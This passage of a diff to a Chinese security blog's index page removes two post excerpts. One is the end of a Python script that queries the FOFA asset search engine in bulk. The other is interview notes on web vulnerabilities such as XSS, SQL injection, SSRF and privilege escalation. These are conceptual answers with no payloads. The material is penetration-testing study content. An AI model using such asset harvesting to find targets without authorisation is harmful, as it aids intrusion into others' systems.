class="line">  url += query_str</span><br><span class="line">  print(url)</span><br><span class="line">  <span class="comment"># 发送请求</span></span><br><span class="line">  <span class="comment">#构建请求对象</span></span><br><span class="line">  request_ob = request.Request(url=url,headers=getheaders())</span><br><span class="line">  <span class="comment">#发送请求</span></span><br><span class="line">  resp = request.urlopen(request_ob)</span><br><span class="line">  print(resp.read())</span><br><span class="line">  <span class="comment"># filename = keyword + &#x27;.html&#x27;</span></span><br><span class="line">  <span class="comment"># with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span></span><br><span class="line">  <span class="comment">#   fp.write(resp.read().decode())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getheaders()</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210617023338871.png" alt="image-20210617023338871"></p>
-<p>返回结果中获取了url链接，接下来要做得就是解析返回结果，提取关键信息。先睡了，明天写一下分析以及脚本完善。bb</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a>
-    
-    <a class="article-more-a" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安恒面经整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h3 id="安恒面经整理："><a href="#安恒面经整理：" class="headerlink" title="安恒面经整理："></a>安恒面经整理：</h3><p><strong>自我介绍：</strong>21岁，大三、哪里人，所学专业，性格活泼外向、从大二开始对安全感兴趣。</p>
-<p><strong>公司做过哪些工作：</strong>略</p>
-<p><strong>知道哪些漏洞：</strong> 系统漏洞（linux、windows）  web漏洞、设备、网络产品漏洞</p>
-<p><strong>web漏洞有哪些：</strong> 语言漏洞（php被黑  被加后门）、web服务器漏洞（apache、nginx、jboss、apache）、cms漏洞、oa产品漏洞、开发框架漏洞、应用漏洞（web应用漏洞、服务器应用漏洞）</p>
-<p><strong>系统层面漏洞有哪些：</strong>windows： SMB远程代码执行、win32k 本地提权漏洞、历史漏洞库。linux： 相对来说少一些。sudo 权限提升漏洞、内核提权漏洞等等</p>
-<p><strong>xss形成原理  是否测试过xss：</strong>测过。原理是没有对用户输入做严格校验与过滤。一般推荐白名单（存在绕过可能），html实体化等等。灰盒测试挖到phpyun 两个xss。</p>
-<p><strong>有参加过ctf比赛ctf负责哪些方面：</strong>没有，但是挖过src，美团高校赛</p>
-<p><strong>sql注入可以达到什么效果：</strong>获取信息（爆库托库）、数据库权限、甚至系统权限   </p>
-<p><strong>udf提权:</strong> 用户定义函数提权。原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39683163/article/details/113276587">https://blog.csdn.net/weixin_39683163/article/details/113276587</a></p>
-<p><strong>csrf防御：</strong> 对敏感操作做二次校验，加入随机token 使得攻击者无法冒充合法用户发起恶意请求</p>
-<p><strong>ssrf能达到什么效果：</strong> 内网信息收集 </p>
-<p><strong>脚本能力：</strong> 信息收集的小工具，比如nmap+masscan，cms识别器、小爬虫、数据提取脚本、</p>
-<p><strong>用java做过什么东西：</strong> 学生管理系统（javase）</p>
-<p>中间件反序列化漏洞 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
-<p>在公司发现过什么漏洞场景：购物app，需要登录，购物车里选择地址，或自己已经有的地址，渗透如何测试，</p>
-<p><strong>还问逻辑漏洞还有哪些：</strong> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1763568">https://cloud.tencent.com/developer/article/1763568</a></p>
-<p>授权类：</p>
-<p>垂直越权：比如普通用户可以修改管理员的密码</p>
-<p>水平越权：比如可以查看其他用户的订单</p>
-<p>验证码：</p>
-<p>未验证、复用、爆破、篡改服务端返回信息、等等</p>
-<p>业务数据篡改：</p>
-<p>金额、订单数量篡改</p>
-<p>重放攻击：</p>
-<p>用于身份认证</p>
-<p>邮箱短信轰炸：</p>
-<p><strong>sql注入点怎么测：</strong> 测试动态参数、判断程序执行 是成功、失败、waf拦截、forbidden、404、还是什么，进而判断出可能存在的注入点。</p>
-<p><strong>用哪些工具测试：</strong> 熟悉sqlmap的使用即可</p>
-<p><strong>你是从什么时候开始对安全感兴趣的   关注过安全资讯：</strong>大一，freebuf、seebug、公众号、08067、论坛、peiqiwiki、hackmoon、tg等等</p>
-<p><strong>tools有账号么：</strong>有，邮件发了自己一篇漏洞挖掘的笔记，就过了。  </p>
-<p><strong>有挖到过src吗：</strong>有，美团、补天 （好大夫）、公益src、教育src </p>
-<p><strong>linux安全日志位置：</strong>  </p>
-<p><strong>以后打算与发展:</strong> 想往内网（第一选择）或者python安全开发方向（为辅助）走。</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/16/%E5%AE%89%E6%81%92%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
